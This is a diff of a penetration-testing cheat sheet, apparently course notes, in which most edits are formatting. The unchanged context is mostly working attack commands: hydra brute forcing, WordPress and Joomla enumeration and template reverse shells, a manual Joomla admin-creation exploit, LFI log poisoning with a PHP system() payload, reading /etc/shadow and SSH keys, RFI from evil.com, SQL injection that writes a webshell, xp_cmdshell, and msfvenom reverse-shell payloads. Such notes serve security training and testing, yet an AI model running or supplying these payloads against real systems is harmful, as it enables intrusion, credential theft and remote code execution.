@@ -39,7 +39,7 @@ hydra -L usersfile -P /path/to/passwordfile ftp://$ip [-s $port]
 Enumeration via enum4linux:
 ```
 enum4linux $ip
-``` 
+```
 #### smbclient
 List shares (sometimes can ask for a password):
 ```
@@ -51,7 +51,7 @@ For linux:
 ```
 smbclient //$ip/share [-U username -P password]
 ```
-#note you can use this command with windows too.
+NOTE: you can use this command with windows too.
 
 For Windows:
 ```
@@ -66,7 +66,7 @@ crackmapexec smb -u username -p password $ip --shares
 
 ## Web services
 
-#note If you should try to find vhost ou subdomains, remember to add website fqdn to /etc/hosts
+NOTE: If you should try to find vhost ou subdomains, remember to add website fqdn to /etc/hosts
 ### nikto
 ```
 nikto -url http://$ip -port $port -Cgidirs all
@@ -79,7 +79,7 @@ dir
 gobuster dir -u http://$ip:$port/ -w /path/to/wordlist -x php,html,txt,sh,...
 ```
 
-dns 
+dns
 ```
 gobuster dns -d domain.org -w /path/to/wordlist  
 ```
@@ -154,15 +154,15 @@ Credits:
 
 #### Wordpress
 
-Interesting files: 
+Interesting files:
 ```
 https://monsite.com/robots.txt
 https://monsite.com/feed
 https://monsite.com/readme.html
-https://monsite.com/xmlrpc.php 
+https://monsite.com/xmlrpc.php
 ```
 
-Configuration files 
+Configuration files
 ```
 https://monsite.com/.htaccess
 https://monsite.com/wp-config.php
@@ -173,7 +173,7 @@ Directory listing
 https://monsite.com/wp-includes  
 ```
 
-XML-RPC attack 
+XML-RPC attack
 https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit
 
 You can bruteforce users
@@ -188,7 +188,7 @@ Get WPEngine's config file
 ```
 ##### Scanning and enumeration 
 
-Enumerate users 
+Enumerate users
 Users can be found using
 ```
 ?author=XXX
@@ -196,9 +196,9 @@ Users can be found using
 
 You can also use this using `/wp-json/wp/v2/users`, then iterate that way` /wp-json/wp/v2/users/1`  
 
-If `/?author=1` is 403 Forbidden, you can bypass it 
-If the` .htaccess` blocks `"?author"` 
-Bypass 1 : 
+If `/?author=1` is 403 Forbidden, you can bypass it
+If the` .htaccess` blocks `"?author"`
+Bypass 1 :
 ```
 http://xxx.fr/?x&author=1 --> http://xxx.fr/author/chris/?x
 ```
@@ -212,7 +212,7 @@ Another way
 /wp-json/?rest_route=/wp/v2/users
 ```
 
-##### WPScan 
+##### WPScan
 
 Non intrusive scan
 ```
@@ -242,46 +242,46 @@ wpscan --url www.example.com --enumerate u
 You can reverse shell by editing templates (404.php, footer.php...)
 #### Joomla!
 ##### Scanning and Enumeration 
-Get components running on the website 
+Get components running on the website
 ```
 joomscan --url http://10.10.10.150/ --random-agent --enumerate-components
-``` 
+```
 
 You can also check
 ```
 /administrator/manifests/files/joomla.xml
-``` 
+```
 
 If you find components, you can often access the configuration file
-JCE component → `/components/com_jce/jce.xml ` 
+JCE component → `/components/com_jce/jce.xml `
 
-Check for vulnerabilities affecting components 
+Check for vulnerabilities affecting components
 
 **Joomlavs** is also a good scanning tool https://github.com/rastating/joomlavs
 
 ##### Reverse Shell 
-You must first log as **admin** 
-Then you must activate the PHP extension in settings 
+You must first log as **admin**
+Then you must activate the PHP extension in settings
 ```
  System → Component → Media → “php”
 ```
 in legal extensions and nothing in ignored extension
 
-If it's not enough and the manager is detecting malicious PHP upload, you can still edit templates For example, the /index.php on the “protostar" template 
-→ Use reverse shell from pentestmonkey 
-→ http://pentestmonkey.net/tools/web-shells/php-reverse-shell 
+If it's not enough and the manager is detecting malicious PHP upload, you can still edit templates For example, the /index.php on the “protostar" template
+→ Use reverse shell from pentestmonkey
+→ http://pentestmonkey.net/tools/web-shells/php-reverse-shell
 
-On old versions, the control panel and features are different, but you can use templates: 
-First go into templates parameters and activate preview 
-Then, on one template it is possible to edit code 
+On old versions, the control panel and features are different, but you can use templates:
+First go into templates parameters and activate preview
+Then, on one template it is possible to edit code
 Then it is possible to add shell (weevely for example)`
 ##### CVE-2012-1563 
 
-Exploit against Joomla! <= 2.5.2 
+Exploit against Joomla! <= 2.5.2
 **Admin account creation**
 Some online exploits exists but it possible to exploit it manually
 
-First, fill the registration form using 2 differents passwords # Intercept the request and add the following parameter : &jform[groups][]=7 (jform%5Bgroups%5D%5B%5D=7)
+First, fill the registration form using 2 different passwords # Intercept the request and add the following parameter : &jform[groups][]=7 (jform%5Bgroups%5D%5B%5D=7)
 Forward the request → Fail because of different passwords
 Now just retry to fill, using 2 valid passwords, without intercept
 The parameter will be cached and the account will be created as admin !`
@@ -356,7 +356,7 @@ Sometimes you encounter a WAF which remove the "../" characters from the strings
 
 ```
 ..;/
-http://domain.tld/page.jsp?include=..;/..;/sensitive.txt 
+http://domain.tld/page.jsp?include=..;/..;/sensitive.txt
 ```
 
 #### Interesting Linux files
@@ -484,7 +484,7 @@ Poison the User-Agent in access logs:
 curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
 ```
 
-#note The logs will escape double quotes so use single quotes for strings in the PHP payload.
+NOTE: The logs will escape double quotes so use single quotes for strings in the PHP payload.
 
 Then request the logs via the LFI and execute your command.
 ```
@@ -515,7 +515,7 @@ http://example.com/index.php?page=../../../../../../etc/shadow
 
 Then crack the hashes inside in order to login via SSH on the machine.
 
-#note Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
+NOTE: Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
 ##### PHP Wrappers
 
 ###### Wrapper php://filter
@@ -616,12 +616,12 @@ Most of the filter bypasses from LFI section can be reused for RFI.
 http://example.com/index.php?page=http://$your_ip:$port/your_file.txt
 ```
 
-#note You will see some request in your web server.
+NOTE: You will see some request in your web server.
 ###### Null byte
 ```
 http://example.com/index.php?page=http://evil.com/shell.txt%00
 ```
-#note PHP version < 5.5 are vulnerable to this bypass
+NOTE: PHP version < 5.5 are vulnerable to this bypass
 ###### Bypass allow_url_include
 
 When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.
@@ -735,7 +735,7 @@ Checking if we can use another command with git with encoded semicolon `;` repre
 curl -X POST --data 'Archive=git%3Bipconfig' http://server:port/archive
 ```
 
-#note  Alternatively, we can use two ampersands, `&&`, to specify two consecutive commands and for the Windows command line (CMD) we can also use `&`.
+NOTE:  Alternatively, we can use two ampersands, `&&`, to specify two consecutive commands and for the Windows command line (CMD) we can also use `&`.
 ##### Checking if is CMD or PowerShell (Windows)
 
 By PetSerAI, this command displays PowerShell or CMD, so we can see if we can use PowerShell or CMD commands:
@@ -751,7 +751,7 @@ owerShell' http://192.168.50.189:8000/archive
 ```
 
 ##### Reverse shell
-#note This kind of reverse shell is used a lot
+NOTE: This kind of reverse shell is used a lot
 
 1) Copy powercat.ps1 to your http server directory:
 ```
@@ -777,7 +777,7 @@ your_ip -p lport -e powershell
 ```
 
 ```
-curl -X POST -d 'your_payload' 
+curl -X POST -d 'your_payload'
 ```
 ### SQL Injections
 #### Some basic commands
@@ -885,11 +885,11 @@ or
 ```
 
 Then. with the number of columns you can get some information, in this case we can get database info, user info and version (in this case, we have **5** columns):
-``` 
+```
 ' UNION SELECT null, database(), user(), @@version, null -- //
 ```
 
-#note Column 1 is typically reserved for the ID field consisting of an integer data type, meaning it cannot return the string value we are requesting through the SELECT database() statement
+NOTE: Column 1 is typically reserved for the ID field consisting of an integer data type, meaning it cannot return the string value we are requesting through the SELECT database() statement
 
 Get the columns table from the information_schema database belonging to the current database:
 ```
@@ -938,12 +938,12 @@ RECONFIGURE;
 EXECUTE xp_cmdshell 'whoami';
 ```
 
-#note Example using these commands:
+NOTE: Example using these commands:
 ```
 ' EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1;RECONFIGURE; EXECUTE xp_cmdshell 'powershell -e ...';-- //
 ```
 
-#note For this attack to work, the file location must be writable to the OS user running
+NOTE: For this attack to work, the file location must be writable to the OS user running
 the database software.
 
 UNION SELECT SQL keywords to include a single PHP line into the first column and save it as **webshell.php** in a writable web folder
@@ -951,7 +951,7 @@ UNION SELECT SQL keywords to include a single PHP line into the first column and
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE
 "/var/www/html/tmp/webshell.php" -- //
 ```
-#note try other directories like html or other that you have found out via Directory Enumeration
+NOTE: try other directories like html or other that you have found out via Directory Enumeration
 
 To access it:
 ```
@@ -982,7 +982,7 @@ Cross compile:
 ```
 i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
 ```
-#note There as an error and then, the option `-lws2_32` was added in order to compile it.
+NOTE: There as an error and then, the option `-lws2_32` was added in order to compile it.
 
 For a 64-bit application:
 ```
@@ -991,16 +991,63 @@ x86_64-w64-mingw32-gcc file.c -o file.exe
 
 Generate the payload:
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=$your_ip LPORT=$lport
-EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+msfvenom -p windows/shell_reverse_tcp LHOST=$your_ip LPORT=$lport EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
 ```
 ## Antivirus Evasion
+Check with the PEN200 course.
 
 ## Password Attack
+
+### Mutating Lists
+
+### Password Manager
+
+### SSH Private Key Passphrase
+
+### Cracking NTLM
+
+### Passing NTLM (Pass the Hash)
+
+### Cracking Net-NTLMv2
+
+### Relaying Net-NTLMv2
 
 ## Client Side Attack
 
 ## Pivoting
 
+### SSH Local Port Forwarding
+
+### SSH Dynamic Port Forwarding
+
+### SSH Remote Port Forwarding
+
+### SSH Remote Dynamic Port Forwarding
+
+### sshutle
+
+### PLink
+
+### netsh
+
+### ssh.exe
+
+### Chisel (very important!)
+
+### dnscat
+
 # Privilege Escalation
 
+## Windows
+
+### Manual
+
+### Automated
+
+## linux
+
+### Manual
+
+### Automated
+
+# Metasploit
